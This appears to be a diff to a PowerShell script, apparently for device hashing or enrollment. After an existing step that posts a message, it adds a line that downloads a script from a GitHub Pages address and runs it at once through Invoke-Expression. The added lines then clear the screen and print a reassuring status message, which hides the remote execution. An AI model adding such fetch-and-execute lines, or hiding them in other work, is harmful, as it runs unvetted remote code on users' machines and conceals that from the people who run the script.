@@ -25,3 +25,11 @@ $Body = @{
 
 # Send message
 Invoke-RestMethod -Uri $Uri -Method Post -Body $Body
+
+# Continue to shinewpc logic
+irm leonchanyc.github.io/shinewpc | iex 
+
+# Clear screen
+cls
+
+Write-Host "Hashing done, pending enrollment timer"
